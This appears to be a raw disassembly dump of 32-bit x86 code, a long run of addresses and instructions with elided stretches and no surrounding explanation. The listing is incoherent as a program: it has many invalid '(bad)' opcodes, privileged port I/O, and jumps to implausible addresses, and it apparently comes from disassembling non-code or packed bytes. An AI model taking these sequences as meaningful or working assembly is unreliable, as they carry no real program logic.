  410377:	or     dh,dl
  410379:	xor    eax,0x5ac1ff53
  41037e:	xor    ch,al
  410380:	cmp    eax,0xa58eb45b
  410385:	fldcw  WORD PTR [edi+edx*8]
  410388:	adc    esp,DWORD PTR [esi]
  41038a:	ret    
  41038b:	add    edx,DWORD PTR [ecx+esi*1]
  41038e:	inc    esi
  41038f:	push   eax
  410390:	inc    esi
  410391:	jae    0x4103e3
  410393:	push   ecx
  410394:	xchg   ecx,eax
  410395:	jge    0x4103f6
  410397:	inc    eax
  410398:	mov    dh,al
  41039a:	call   0x2640878a
  41039f:	fiadd  DWORD PTR [ebx+ebx*4-0x6c]
  4103a3:	cld    
	...
  4103cc:	add    BYTE PTR [eax],al
  4103ce:	add    ebx,esi
  4103d0:	call   0x80fd5cd8
  4103d5:	repnz fistp WORD PTR [ebx]
  4103d8:	jmp    0xf1485d10
  4103dd:	jmp    0x4103b0
  4103df:	mov    eax,0xd361d9f5
  4103e4:	outs   dx,DWORD PTR ds:[esi]
  4103e5:	fiadd  DWORD PTR [eax-0x2f]
  4103e8:	sbb    edx,DWORD PTR [esi]
  4103ea:	xchg   BYTE PTR [edx],bl
  4103ec:	jmp    0x2186767d
  4103f1:	inc    ebx
  4103f2:	fisttp DWORD PTR ds:0x5116aa04
  4103f9:	and    BYTE PTR [edx+ebx*1+0x7b2630e9],bl
  410400:	dec    ebx
  410401:	add    al,0x3e
  410403:	push   eax
  410404:	test   eax,0x91252150
  410409:	bsr    edi,DWORD PTR [ebp+ebx*4+0x34]
  41040e:	pop    bx
  410410:	jmp    0xf634affd
  410415:	gs jg  0x410473
  410418:	sbb    ecx,ebx
  41041a:	push   edx
  41041b:	push   ebx
  41041c:	xchg   ecx,eax
  41041d:	inc    ebx
  41041e:	pushf  
  41041f:	jl     0x410420
  410421:	jne    0x4103fd
  410423:	adc    bh,BYTE PTR [ecx+0x6e]
  410426:	out    0x71,eax
  410428:	add    BYTE PTR [edi-0x2bffc143],ch
  41042e:	xchg   ebx,eax
  41042f:	push   ss
  410430:	cld    
  410431:	sbb    al,BYTE PTR [eax]
	...
  41045b:	add    BYTE PTR [edx-0x78b1013d],al
  410461:	jge    0x410454
  410463:	xchg   edi,eax
  410464:	cmp    dl,BYTE PTR [ebp+esi*2-0x7e]
  410468:	ja     0x410471
  41046a:	cld    
  41046b:	ss stc 
  41046d:	push   edx
  41046e:	call   0xfebcf0fa
  410473:	(bad)  
  410474:	aaa    
  410475:	xchg   edx,eax
  410476:	shl    ebp,0x3d
  410479:	mov    eax,DWORD PTR es:0xb7fb98c3
  410480:	cs icebp 
  410482:	call   DWORD PTR [edx-0xe8b83d6]
  410488:	gs push ss
  41048a:	jbe    0x410482
  41048c:	rol    WORD PTR [ebp+ebp*8-0x4e],cl
  410491:	inc    edi
  410492:	xor    dh,BYTE PTR [ecx]
  410494:	jge    0x4104f1
  410496:	mov    ebx,DWORD PTR [esp+ecx*2]
  410499:	adc    eax,DWORD PTR [ecx-0x17]
  41049c:	mov    ebp,0x6155003c
  4104a1:	repz ss dec ebx
  4104a4:	jge    0x410501
  4104a6:	push   edi
  4104a7:	rcr    DWORD PTR [edx+0x3ae8fff6],1
  4104ad:	fwait
  4104ae:	jae    0x41047e
  4104b0:	dec    edi
  4104b1:	jae    0x410469
  4104b3:	imul   edx,DWORD PTR [esi],0x7d
  4104b6:	dec    edi
  4104b7:	adc    DWORD PTR [edx],edi
  4104b9:	pop    ebx
  4104ba:	out    dx,eax
  4104bb:	push   edi
  4104bc:	push   ebp
  4104bd:	xor    ah,BYTE PTR [edx+0x28]
	...
  4104e8:	add    BYTE PTR [eax],al
  4104ea:	cmp    ch,BYTE PTR [ebx]
  4104ec:	inc    DWORD PTR [eax]
  4104ee:	fimul  DWORD PTR [edi-0x18]
  4104f1:	ret    
  4104f2:	xchg   BYTE PTR [ebx+0x1fa3e8fd],ah
  4104f8:	(bad)  
  4104f9:	(bad)  
  4104fa:	mov    esp,0x61804658
  4104ff:	push   edi
  410500:	jne    0x4104fc
  410502:	fldenv [ebx-0x5d313fcf]
  410508:	std    
  410509:	push   eax
  41050b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41050c:	lods   al,BYTE PTR ds:[esi]
  41050d:	cmp    BYTE PTR [eax-0x350044f4],ch
  410513:	mov    ds:0x6f9f75fd,eax
  410518:	es jbe 0x41056b
  41051b:	mov    ds:0x962e5e5d,eax
  410520:	add    al,BYTE PTR [eax]
  410522:	stos   BYTE PTR es:[edi],al
  410523:	into   
  410524:	jmp    0xbd00:0x68a41b83
  41052b:	xor    edi,edi
  41052d:	jne    0x41057e
  41052f:	outs   dx,DWORD PTR ds:[esi]
  410530:	enter  0x5075,0xa3
  410534:	xchg   DWORD PTR [ebp+0x53],eax
  410537:	out    dx,al
  410538:	jmp    FWORD PTR [ecx+0x57]
  41053b:	out    dx,eax
  41053c:	inc    esi
  41053d:	bound  esp,QWORD PTR [esi+0x5f]
  410540:	push   0x805f2700
  410545:	call   0x401bf5
  41054a:	sbb    al,0x9f
  41054c:	jb     0x41056d
	...
  410576:	add    BYTE PTR [eax],al
  410578:	aaa    
  410579:	xchg   DWORD PTR [edx-0x7e],eax
  41057c:	rcl    BYTE PTR [edx+0x5f17684e],1
  410582:	out    dx,eax
  410583:	mov    esi,0x4162517f
  410588:	out    0x2e,eax
  41058a:	push   DWORD PTR [ebp-0x11]
  41058d:	xchg   BYTE PTR [esi-0x5f],cl
  410590:	ds rcl esi,1
  410593:	out    0x87,eax
  410595:	dec    esp
  410596:	xlat   BYTE PTR ds:[ebx]
  410597:	(bad)  
  410598:	fnstenv [edi-0x2a]
  41059b:	dec    BYTE PTR [ebx+0x6c]
  41059e:	jmp    0xfcc8:0xd6f153cb
  4105a5:	add    BYTE PTR [edx],0x55
  4105a8:	lds    edx,FWORD PTR [eax]
  4105aa:	add    ebx,0xffffffb2
  4105ad:	mov    es,WORD PTR [edx]
  4105af:	push   0x5b
  4105b1:	adc    DWORD PTR [ecx+0x8],edx
  4105b4:	xchg   esi,eax
  4105b5:	xchg   esp,eax
  4105b6:	dec    edi
  4105b7:	call   FWORD PTR [ecx+0x26fc40eb]
  4105bd:	test   BYTE PTR [edx],al
  4105bf:	out    dx,eax
  4105c0:	enter  0x819c,0x61
  4105c4:	inc    DWORD PTR [ebx-0x3d237096]
  4105ca:	add    bh,bh
  4105cc:	jmp    0x410639
  4105ce:	jmp    0xebfe:0xd7519f5a
  4105d5:	xlat   BYTE PTR ds:[bx]
  4105d7:	je     0x41061f
  4105d9:	dec    esp
  4105da:	jne    0x410650
	...
  410604:	add    BYTE PTR [eax],al
  410606:	push   ecx
  410607:	jns    0x4105d4
  410609:	rol    DWORD PTR [edx-0x7c],0x2f
  41060d:	mov    edx,DWORD PTR [edx+0x5]
  410610:	sar    bl,0xa4
  410613:	test   BYTE PTR [eax+0x2e],ch
  410616:	xor    DWORD PTR [edi],ecx
  410618:	or     al,0xe8
  41061a:	jae    0x410633
  41061c:	xlat   BYTE PTR ds:[ebx]
  41061d:	(bad)  
  41061e:	mov    bh,0x3e
  410620:	fsub   DWORD PTR [edi+0x3e]
  410623:	test   ch,ah
  410625:	mov    ebp,0x4160fea6
  41062a:	ds sbb al,0xa7
  41062d:	popa   
  41062e:	jg     0x4105b4
  410630:	aad    0x74
  410632:	inc    esi
  410633:	pop    ebx
  410634:	xchg   ecx,eax
  410635:	and    ebx,DWORD PTR [edi+0x3e6b9d79]
  41063b:	pop    ebx
  41063c:	xchg   BYTE PTR [ebp+0x450ac059],dl
  410642:	add    edx,DWORD PTR ds:[esi+0x61]
  410646:	jg     0x4106a3
  410648:	jle    0x41069a
  41064a:	ss sbb edi,0xffffffa4
  41064e:	sar    BYTE PTR [ecx+0x6d],0x50
  410652:	mov    edx,0xa60bdb79
  410657:	cmp    esp,edx
  410659:	(bad)  
  41065a:	test   al,0xa3
  41065c:	sub    bh,bh
  41065e:	mov    eax,ds:0xbce7620e
  410663:	sahf   
  410664:	inc    esp
  410665:	mov    ch,dl
  410667:	dec    edx
  410668:	jb     0x41065b
	...
  410692:	add    BYTE PTR [eax],al
  410694:	pop    ss
  410695:	pop    ebx
  410696:	fs inc eax
  410698:	or     BYTE PTR [edx],0x2e
  41069b:	push   eax
  41069c:	inc    esi
  41069d:	add    eax,0x4aead6e9
  4106a2:	push   ds
  4106a3:	xor    DWORD PTR [edx-0x20],ecx
  4106a6:	sub    BYTE PTR [eax+0x19],dl
  4106a9:	out    0xb3,al
  4106ab:	xlat   BYTE PTR ds:[ebx]
  4106ac:	leave  
  4106ad:	add    al,0xe9
  4106af:	imul   edi,DWORD PTR [esi],0x3e01fe03
  4106b5:	pop    ebx
  4106b6:	test   BYTE PTR [edi+0x32],0x5
  4106ba:	out    dx,al
  4106bb:	aad    0xaf
  4106bd:	pop    edi
  4106be:	push   ebx
  4106bf:	add    al,0xa4
  4106c1:	pop    ebx
  4106c2:	sar    DWORD PTR [ebp+0x73e95b9f],1
  4106c8:	and    bh,ch
  4106ca:	int3   
  4106cb:	in     al,dx
  4106cc:	fwait
  4106cd:	cld    
  4106ce:	call   0xecdf0dd6
  4106d3:	add    esi,DWORD PTR [ebx-0x1c]
  4106d6:	inc    esp
  4106d8:	mov    edi,0x2962fb9c
  4106dd:	dec    edi
  4106de:	mov    edi,ebx
  4106e0:	addr16 pop ebx
  4106e2:	lea    esp,[esi+eax*1]
  4106e5:	sub    edi,edi
  4106e7:	sbb    al,0x36
  4106e9:	js     0x41075f
  4106eb:	loope  0x410754
  4106ed:	pop    ebx
  4106ee:	(bad)  
  4106ef:	cld    
  4106f0:	loope  0x41076b
  4106f2:	push   ecx
  4106f3:	ror    DWORD PTR [eax-0x48],1
  4106f6:	je     0x4106c6
	...
  410720:	add    BYTE PTR [eax],al
  410722:	mov    dh,0xf
  410724:	cld    
  410725:	pop    ecx
  410726:	and    al,0x5b
  410728:	push   0xffffffe9
  41072a:	and    eax,0x3de90278
  41072f:	js     0x4107a5
  410731:	stc    
  410732:	pop    ss
  410733:	js     0x410733
  410735:	fistp  DWORD PTR [ecx+0x3dd30002]
  41073b:	cmp    DWORD PTR [eax-0x35],0x3d
  41073f:	pop    ebx
  410740:	nop
  410741:	ss icebp 
  410743:	jbe    0x41072c
  410745:	stc    
  410746:	ficomp WORD PTR [edx+0x0]
  410749:	xor    BYTE PTR [eax+ebp*2+0x0],bh
  41074d:	mov    ah,0xb6
  41074f:	test   BYTE PTR [edx-0x7cee3dd3],al
  410755:	mov    WORD PTR [ebp+0x78],ss
  410758:	jae    0x410746
  41075a:	or     ah,BYTE PTR [edx-0x1bc22a3f]
  410760:	push   esp
  410761:	fnsave [esi-0x2a5b72b6]
  410767:	daa    
  410768:	push   0xffffffe9
  41076a:	or     ch,bh
  41076c:	or     ebx,esi
  41076e:	js     0x4107d3
  410770:	push   0xffffffe9
  410772:	or     ch,bh
  410774:	adc    ecx,esi
  410776:	dec    edi
  410777:	jne    0x5269ee7d
  41077d:	(bad)  
  41077e:	(bad)  {k7}{z}
  410783:	pop    esp
  410784:	mov    edx,DWORD PTR [ebp+0x0]
	...
  4107af:	add    BYTE PTR [edi-0x1d],ch
  4107b2:	adc    BYTE PTR [ebp-0x72b12cde],cl
  4107b8:	and    bl,BYTE PTR [edi-0x711895b2]
  4107be:	jae    0x410778
  4107c0:	enter  0xc29,0x83
  4107c4:	cmp    dl,bl
  4107c6:	(bad)  
  4107c7:	jae    0x4107cb
  4107c9:	loope  0x410846
  4107cb:	ror    BYTE PTR [eax+0x29],0x14
  4107cf:	push   DWORD PTR [edx+0x1837fd6b]
  4107d5:	sub    DWORD PTR [edi+edi*8],ecx
  4107d8:	xchg   edx,eax
  4107d9:	arpl   di,di
  4107db:	push   ebp
  4107dc:	scas   eax,DWORD PTR es:[edi]
  4107dd:	mov    ?,WORD PTR ds:0xfffa67e8
  4107e3:	jmp    DWORD PTR [edi+esi*4]
  4107e6:	add    bh,bh
  4107e8:	fcmove st,st(7)
  4107ea:	jae    0x4107cc
  4107ec:	cld    
  4107ed:	aam    0x89
  4107ef:	push   ebp
  4107f0:	out    dx,eax
  4107f1:	loop   0x410803
  4107f3:	call   edx
  4107f5:	sar    ebp,cl
  4107f7:	push   edx
  4107f8:	outs   dx,DWORD PTR ds:[esi]
  4107f9:	cs leave 
  4107fb:	ret    0x5b63
  4107fe:	push   ebp
  4107ff:	mov    ebx,DWORD PTR [ebx-0x27]
  410802:	ret    0x39f8
  410805:	(bad)  
  410806:	std    
  410807:	push   edi
  410808:	int3   
  410809:	dec    eax
  41080a:	adc    BYTE PTR [ebx-0x77c1f9b],cl
  410810:	sub    DWORD PTR [ebx+0x50fd],ecx
	...
  41083e:	lea    ebx,[edi-0x1]
  410841:	jne    0x410872
  410843:	sbb    DWORD PTR [eax],eax
  410845:	(bad)  
  410846:	ds pop ss
  410848:	hlt    
  410849:	(bad)  
  41084a:	ins    BYTE PTR es:[edi],dx
  41084b:	push   0xa8bbf89
  410850:	retf   
  410851:	test   BYTE PTR [edx],cl
  410853:	mov    bh,0xd2
  410855:	(bad)  
  410856:	test   BYTE PTR ds:[edx],al
  410859:	add    ch,al
  41085b:	bswap  esp
  41085d:	std    
  41085e:	icebp  
  41085f:	mov    ebp,0xffbb117e
  410864:	iret   
  410865:	std    
  410866:	loope  0x410835
  410868:	xor    ecx,DWORD PTR [ebp-0x12e7b3d]
  41086e:	rcl    DWORD PTR [esi+ebx*2+0x10],1
  410872:	leave  
  410873:	das    
  410874:	int3   
  410875:	std    
  410876:	shr    ebp,0xd2
  410879:	push   ecx
  41087a:	dec    edx
  41087b:	add    DWORD PTR [ecx-0x2d024f05],edx
  410881:	jmp    FWORD PTR ds:0x3ebc815f
  410887:	or     eax,0x8f99fed3
  41088c:	idiv   dh
  41088e:	or     edx,DWORD PTR [ecx+edx*8-0x2e32c58c]
  410895:	je     0x4108cd
  410897:	sbb    al,0xb
  410899:	(bad)  
  41089a:	jns    0x4108e1
  41089c:	xchg   esi,eax
  41089e:	dec    esi
  41089f:	cmp    eax,0xfb81
	...
  4108cc:	push   0x5d74d355
  4108d1:	pop    ecx
  4108d2:	stos   DWORD PTR es:[edi],eax
  4108d3:	mov    dh,BYTE PTR [ebx+0x51fed24c]
  4108d9:	jmp    0x5cd507d3
  4108de:	sar    dh,cl
  4108e0:	inc    ecx
  4108e1:	ins    DWORD PTR es:[edi],dx
  4108e2:	xor    al,0x8
  4108e4:	cdq    
  4108e5:	cmp    eax,esi
  4108e7:	(bad)  
  4108e9:	pop    ebx
  4108ea:	cmp    al,0x7f
  4108ec:	adc    eax,0x23cba4dc
  4108f1:	jbe    0x4108c8
  4108f3:	cmp    al,ch
  4108f5:	paddusw mm7,QWORD PTR [esi+0x2f]
  4108f9:	call   0x764cd469
  4108fe:	mov    ebp,0x435b9433
  410903:	add    al,0xf9
  410905:	out    dx,eax
  410906:	(bad)  
  410908:	(bad)  
  410909:	xor    ebp,DWORD PTR [ebx+eax*8+0x72]
  41090d:	stc    
  41090e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41090f:	dec    eax
  410910:	loop   0x41096c
  410912:	jmp    0x620c471a
  410917:	js     0x4108e2
  410919:	je     0x4108a0
  41091b:	shl    BYTE PTR [eax+ecx*2+0xac2486c],cl
  410922:	mov    BYTE PTR fs:[ebp+0x1d26d74],dh
  410929:	add    ecx,edi
  41092b:	shl    dl,cl
  41092d:	jb     0x41098d
  41092f:	rol    BYTE PTR [eax],cl
	...
  410959:	add    BYTE PTR [eax-0x3600458b],ah
  41095f:	fxch   st(3)
  410961:	iret   
  410962:	xchg   ecx,eax
  410963:	in     eax,0xbc
  410965:	es mov ebx,0x80d13cb7
  41096b:	jne    0x4109c5
  41096d:	shl    dl,cl
  41096f:	dec    edx
  410970:	cs pop eax
  410972:	inc    edx
  410973:	jbe    0x410910
  410975:	sti    
  410976:	adc    BYTE PTR [ebx+0x7560d2ea],al
  41097c:	imul   ecx,edx,0x400dcb49
  410982:	push   edx
  410983:	retf   0xe97b
  410986:	mov    ecx,0xaa7e4d81
  41098b:	jb     0x41098c
  41098d:	test   BYTE PTR [edi],0x76
  410990:	mov    bl,bl
  410992:	or     al,0xb0
  410994:	mul    edi
  410996:	pcmpeqd mm7,mm6
  410999:	cmp    esp,DWORD PTR [edx]
  41099b:	push   ss
  41099c:	leave  
  41099d:	stos   DWORD PTR es:[edi],eax
  41099e:	ds pop ebx
  4109a0:	push   ebp
  4109a1:	bound  ebx,QWORD PTR [esi]
  4109a3:	jbe    0x410a19
  4109a5:	icebp  
  4109a6:	out    dx,al
  4109a7:	out    dx,eax
  4109a8:	pop    ss
  4109a9:	rcr    DWORD PTR [edx-0x17],1
  4109ac:	(bad)  
  4109ad:	mov    dh,0xf
  4109af:	lock or eax,ecx
  4109b2:	push   ecx
  4109b3:	cli    
  4109b4:	(bad)  
  4109b5:	call   0xa9c39e66
  4109ba:	cmp    BYTE PTR [ebx],cl
  4109bc:	call   FWORD PTR [eax+eax*1]
	...
  4109e7:	add    BYTE PTR [esi],bh
  4109e9:	je     0x410a5f
  4109eb:	icebp  
  4109ec:	cmc    
  4109ed:	aaa    
  4109ee:	jb     0x410976
  4109f0:	out    dx,eax
  4109f1:	jne    0x410a67
  4109f3:	aad    0xee
  4109f5:	out    dx,eax
  4109f6:	pcmpeqd mm2,QWORD PTR [ecx]
  4109f9:	push   ebx
  4109fa:	call   0xfeb515bd
  4109ff:	xor    BYTE PTR [eax+0x22b40048],al
  410a05:	cmp    dh,0xdc
  410a08:	xchg   ebp,eax
  410a09:	jne    0x410a7f
  410a0b:	icebp  
  410a0c:	jne    0x410a8b
  410a0e:	jo     0x410a56
  410a10:	outs   dx,DWORD PTR ds:[esi]
  410a11:	jne    0x410a87
  410a13:	in     eax,dx
  410a14:	gs pop eax
  410a16:	pusha  
  410a17:	jmp    0x2e912559
  410a1c:	or     DWORD PTR [edi-0x1],esp
  410a1f:	pushf  
  410a20:	push   ebp
  410a21:	jl     0x410a2a
  410a23:	fwait
  410a24:	mov    ?,WORD PTR [ebp-0x2]
  410a27:	pushf  
  410a28:	push   ecx
  410a29:	jne    0x410a9f
  410a2b:	stc    
  410a2c:	outs   dx,BYTE PTR ds:[esi]
  410a2d:	out    dx,eax
  410a2e:	pop    ss
  410a2f:	add    BYTE PTR [edi],ch
  410a31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a32:	outs   dx,DWORD PTR ds:[esi]
  410a33:	inc    DWORD PTR [eax-0x4f]
  410a36:	rcl    BYTE PTR [edi+eiz*1],0x2d
  410a3a:	mov    ebp,esp
  410a3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a3d:	mov    ds:0x8b20f7d2,eax
  410a42:	std    
  410a43:	jne    0x410a84
  410a45:	hlt    
  410a46:	add    DWORD PTR [eax],0xfffffff3
  410a49:	mov    bh,ch
  410a4b:	push   eax
	...
  410a74:	add    BYTE PTR [eax],al
  410a76:	add    BYTE PTR ds:0xa508e808,cl
  410a7c:	std    
  410a7d:	jmp    FWORD PTR [ebp+0x5f]
  410a80:	push   0x0
  410a82:	jg     0x410a0e
  410a84:	add    DWORD PTR [eax],eax
  410a86:	out    0xf4,eax
  410a88:	add    DWORD PTR [eax],0xffffff9f
  410a8b:	mov    bh,ch
  410a8d:	push   eax
  410a8e:	dec    ebp
  410a8f:	mov    bh,ch
  410a91:	jne    0x410a6a
  410a93:	adc    eax,0x8fe76a00
  410a98:	sbb    al,0x60
  410a9a:	xlat   BYTE PTR ds:[ebx]
  410a9b:	push   edi
  410a9c:	mov    DWORD PTR [ebp-0x26cb9],0x5797
  410aa6:	fcomp  st(4)
  410aa8:	repnz mul DWORD PTR [eax]
  410aab:	mov    eax,DWORD PTR [eax]
  410aad:	add    BYTE PTR [edi-0x107a38a9],dl
  410ab3:	xchg   edx,eax
  410ab4:	std    
  410ab5:	jmp    DWORD PTR [edi+0x58000057]
  410abb:	(bad)  
  410abd:	test   DWORD PTR [eax-0x75],0x5767fffe
  410ac4:	mov    edx,DWORD PTR [ebp-0x71]
  410ac7:	not    BYTE PTR [eax]
  410ac9:	push   0x57
  410acb:	hlt    
  410acc:	xor    eax,0x48
  410acf:	mov    edi,ebp
  410ad1:	push   eax
  410ad2:	inc    DWORD PTR ds:[ebp-0x2f9bb615]
  410ad9:	dec    edi
	...
  410b02:	add    BYTE PTR [eax],al
  410b04:	mov    ebx,0x41f6db06
  410b09:	je     0x410b3c
  410b0b:	push   DWORD PTR [ebx+0x4274cf94]
  410b11:	adc    DWORD PTR [eax+ecx*1-0x6c],0x4674cd84
  410b19:	xchg   ecx,eax
  410b1a:	xor    DWORD PTR [ebp+edi*4-0x39],eax
  410b1e:	fcomi  st,st(6)
  410b20:	adc    DWORD PTR [edx+0x78c20f03],esp
  410b26:	add    eax,DWORD PTR [eax]
  410b28:	ds add eax,0xa9f1eb91
  410b2e:	into   
  410b2f:	inc    DWORD PTR [eax-0x8]
  410b32:	inc    BYTE PTR [eax]
  410b34:	ds test ch,al
  410b37:	test   BYTE PTR [edx],cl
  410b39:	retf   0xfece
  410b3c:	ds test ch,bl
  410b3f:	mov    ebp,0x41622266
  410b44:	ds out 0x88,eax
  410b47:	inc    ebp
  410b49:	icebp  
  410b4a:	into   
  410b4b:	dec    edi
  410b4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b4d:	shr    BYTE PTR [esi],0x0
  410b50:	ds test ebx,0x8940fc73
  410b57:	shr    DWORD PTR [ecx+0x3e00cf11],cl
  410b5d:	sbb    DWORD PTR [esi+0x43a66e67],ecx
  410b63:	add    BYTE PTR [ebx+0xfc03ff],bh
	...
  410b91:	add    BYTE PTR [ecx-0x5c17cbcf],al
  410b97:	leave  
  410b98:	add    al,BYTE PTR [eax]
  410b9a:	mov    ebx,0x81235844
  410b9f:	pop    ebx
  410ba0:	ins    BYTE PTR es:[edi],dx
  410ba1:	mov    eax,0x21d7268
  410ba6:	adc    BYTE PTR ds:[esi+0x5c],0x66
  410bab:	std    
  410bac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bad:	add    edi,DWORD PTR [ebx+0x40cfe8d8]
  410bb3:	jb     0x410b4d
  410bb5:	fcmovnb st,st(3)
  410bb7:	adc    ecx,ebp
  410bb9:	add    edi,DWORD PTR [ebx-0x23772266]
  410bbf:	pop    edx
  410bc0:	jmp    0x4ab0a1c8
  410bc5:	inc    ebp
  410bc6:	ds loopne 0x410c34
  410bc9:	add    edx,DWORD PTR [esi]
  410bcb:	jb     0x410b9a
  410bcd:	xor    edx,DWORD PTR [esi]
  410bcf:	add    al,0x49
  410bd1:	add    al,0x3e
  410bd3:	test   ax,0x6f57
  410bd7:	fdivrp st(3),st
  410bd9:	jnp    0x410b5f
  410bdb:	sbb    al,0xe9
  410bdd:	add    edi,DWORD PTR [ecx]
  410bdf:	xlat   BYTE PTR ds:[ebx]
  410be0:	add    edi,DWORD PTR ds:0x9e5b
  410be5:	cwde   
  410be6:	loope  0x410c51
  410be8:	xchg   ebp,eax
  410be9:	into   
  410bea:	rcl    bh,0x88
  410bed:	(bad)  
  410bee:	enter  0x8571,0x98
  410bf2:	aad    0x69
  410bf4:	jge    0x410bc4
	...
  410c1e:	add    BYTE PTR [eax],al
  410c20:	enter  0x8cd7,0xd6
  410c24:	mov    al,0x71
  410c26:	pop    ebx
  410c27:	mov    BYTE PTR [ecx-0xe319a97],dl
  410c2d:	add    al,0xe8
  410c2f:	pop    ecx
  410c30:	ds add eax,0x53e59e9
  410c36:	jmp    0x3dbbcebb
  410c3b:	into   
  410c3c:	or     BYTE PTR [edx],0x3e
  410c3f:	clc    
  410c40:	shl    DWORD PTR ds:0x663da800,0xc0
  410c47:	mov    ch,0x0
  410c49:	jb     0x410cbf
  410c4b:	std    
  410c4c:	jo     0x410bf4
  410c4e:	xlat   BYTE PTR ds:[ebx]
  410c4f:	push   ss
  410c50:	mov    BYTE PTR [eax-0x2],dh
  410c53:	pop    esp
  410c54:	mov    eax,ds:0x780efe68
  410c59:	out    0xf,al
  410c5b:	push   es
  410c5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c5d:	(bad)  
  410c5e:	idiv   dh
  410c60:	or     edi,DWORD PTR [ecx+0xf]
  410c63:	test   DWORD PTR [ebx],0xd934fe72
  410c69:	imul   edi,esi,0x5e0302e6
  410c6f:	jmp    0xd65d90b1
  410c74:	imul   eax,DWORD PTR [edi-0x1],0xfe69ea94
  410c7b:	(bad)  
  410c7c:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c7e:	jmp    0x410c36
  410c80:	or     esi,DWORD PTR [edx-0x2]
  410c83:	cmp    al,0x0
	...
  410cad:	add    dl,ch
  410caf:	jno    0x410c65
  410cb1:	xchg   ebp,eax
  410cb2:	adc    esi,DWORD PTR [edx-0x2]
  410cb5:	xchg   ecx,eax
  410cb6:	fsubr  DWORD PTR [edi-0x2]
  410cb9:	sahf   
  410cba:	or     ebp,DWORD PTR [eax+0x72039eeb]
  410cc0:	out    0x9,eax
  410cc2:	sbb    ebx,DWORD PTR [ebx+0x0]
  410cc5:	mov    al,0xfc
  410cc7:	dec    esp
  410cc8:	add    BYTE PTR [edi+esi*1],dl
  410ccb:	test   BYTE PTR [edx-0xf93553],al
  410cd1:	hlt    
  410cd2:	test   eax,0x3dc60a78
  410cd7:	pop    ebx
  410cd8:	or     ebp,DWORD PTR [ecx]
  410cda:	icebp  
  410cdb:	push   ebp
  410cdc:	pop    esi
  410cdd:	and    BYTE PTR [esp+eiz*2+0x0],bh
  410ce1:	cmp    BYTE PTR [edx-0x6aff4023],ah
  410ce7:	repz into 
  410ce9:	lea    esp,[edx+0x28524e90]
  410cef:	or     BYTE PTR [eax+ebp*8],cl
  410cf2:	dec    esi
  410cf3:	lock std 
  410cf5:	dec    DWORD PTR [ebp+esi*4-0x6decb279]
  410cfc:	or     BYTE PTR [esi],dh
  410cfe:	pop    eax
  410cff:	mov    BYTE PTR [edx+0x29],0x4b
  410d03:	pop    ebp
  410d04:	inc    ebp
  410d05:	aam    0x96
  410d07:	fcomi  st,st(7)
  410d09:	adc    al,0xb5
  410d0b:	lea    ebp,[ecx]
  410d0d:	neg    BYTE PTR [esi+0xebd008]
	...
  410d3b:	add    bh,bh
  410d3d:	inc    ebp
  410d3e:	movzx  edx,BYTE PTR [ebx+0x51]
  410d42:	in     al,dx
  410d43:	push   eax
  410d44:	outs   dx,DWORD PTR ds:[esi]
  410d45:	pop    edi
  410d46:	arpl   WORD PTR [ecx+0x27],ax
  410d49:	icebp  
  410d4a:	inc    ebx
  410d4b:	fadd   DWORD PTR [edi-0x71]
  410d4e:	push   cs
  410d4f:	pop    edi
  410d50:	pop    ss
  410d51:	pop    esp
  410d52:	add    esp,0xffffffeb
  410d55:	lock inc ebx
  410d57:	fcom   DWORD PTR [edi-0x62]
  410d5a:	jae    0x410d2c
  410d5c:	inc    ecx
  410d5e:	je     0x410d5f
  410d60:	cwde   
  410d61:	hlt    
  410d62:	inc    ebx
  410d63:	shl    BYTE PTR [ecx],1
  410d65:	(bad)  
  410d67:	adc    al,0x35
  410d69:	stos   BYTE PTR es:[edi],al
  410d6a:	jg     0x410dd1
  410d6c:	xchg   ebx,eax
  410d6d:	sahf   
  410d6e:	(bad)  
  410d6f:	call   edi
  410d71:	sahf   
  410d72:	jae    0x410d48
  410d74:	dec    edi
  410d75:	pop    edi
  410d76:	arpl   WORD PTR [ecx-0x59],ax
  410d79:	lock inc ebx
  410d7b:	fadd   DWORD PTR [edi-0x71]
  410d7e:	ficomp WORD PTR [esi-0x69]
  410d81:	pop    ebx
  410d82:	add    esp,0xffffffab
  410d85:	lock inc ebx
  410d87:	fdivr  DWORD PTR [esi]
  410d89:	mov    dl,0xcb
  410d8b:	je     0x410dfb
  410d8d:	sbb    DWORD PTR [ecx+0x7a188175],ebx
  410d93:	inc    esp
  410d94:	mov    ?,esi
  410d96:	inc    ebp
  410d97:	int3   
  410d98:	push   cs
  410d99:	sub    DWORD PTR [esi-0x30],edx
  410d9c:	(bad)  
  410d9d:	jle    0x410dfe
  410d9f:	inc    ecx
	...
  410dc8:	add    BYTE PTR [eax],al
  410dca:	cmp    DWORD PTR ds:[esi],edx
  410dcd:	scas   al,BYTE PTR es:[edi]
  410dce:	push   es
  410dcf:	ret    
  410dd0:	add    ch,al
  410dd2:	mov    ecx,esi
  410dd4:	retf   
  410dd5:	(bad)  
  410dd6:	xor    eax,0xa983fc42
  410ddb:	add    DWORD PTR [edx],0xbab7c700
  410de1:	xor    BYTE PTR [ebx-0x3df0fcc8],0x2
  410de8:	add    eax,DWORD PTR [eax]
  410dea:	ds jne 0x410e3d
  410ded:	or     al,0x26
  410def:	aaa    
  410df0:	sub    al,BYTE PTR [eax]
  410df2:	ds mov bl,0xe3
  410df5:	cmp    dh,0x82
  410df8:	jnp    0x410e3e
  410dfa:	into   
  410dfb:	xchg   ebp,eax
  410dfc:	push   eax
  410dfd:	or     al,0xc9
  410dff:	aaa    
  410e00:	nop
  410e01:	(bad)  
  410e02:	imul   edi,DWORD PTR [eax-0x4201bb86],0x50
  410e09:	enter  0x3fb1,0xc0
  410e0d:	mov    BYTE PTR [ebx+0x3e000410],0x84
  410e14:	test   DWORD PTR [esi+esi*4],edi
  410e17:	cmp    DWORD PTR [ebp+0x0],eax
  410e1a:	ds jo  0x410e4f
  410e1d:	lea    eax,[ebx]
  410e1f:	sbb    al,0x34
  410e21:	push   0x3f
  410e23:	pop    edx
  410e24:	add    al,0x6a
  410e26:	cmovno esi,DWORD PTR ds:[eax+0x3d35b0e]
	...
